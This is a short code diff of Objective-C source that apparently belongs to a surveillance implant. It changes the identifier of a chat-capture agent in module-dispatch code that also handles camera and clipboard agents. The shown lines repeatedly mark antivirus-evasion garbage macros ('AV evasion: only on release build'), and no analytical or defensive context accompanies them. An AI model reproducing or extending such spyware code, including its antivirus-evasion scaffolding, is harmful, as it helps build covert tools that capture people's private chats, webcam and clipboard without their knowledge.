@@ -1042,7 +1042,7 @@ typedef struct  {
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_CHAT];
+  NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_CHAT_NEW];
   NSNumber *status  = [aModule objectForKey: MODULES_STATUS_KEY];
   
   if (status == nil || [status boolValue] == FALSE)
@@ -2896,14 +2896,14 @@ typedef struct {
     AV_GARBAGE_002
     
       tmpAgentID = AGENT_CAM;
-    }
+   }
   else if ([moduleName compare: ACTION_MODULE_CHAT] == NSOrderedSame)
   {  
     // AV evasion: only on release build
     AV_GARBAGE_007
-    
-      tmpAgentID = AGENT_CHAT;
-    }
+  
+    tmpAgentID = AGENT_CHAT_NEW;
+  }
   else if ([moduleName compare: ACTION_MODULE_CLIP] == NSOrderedSame)
   {  
     // AV evasion: only on release build
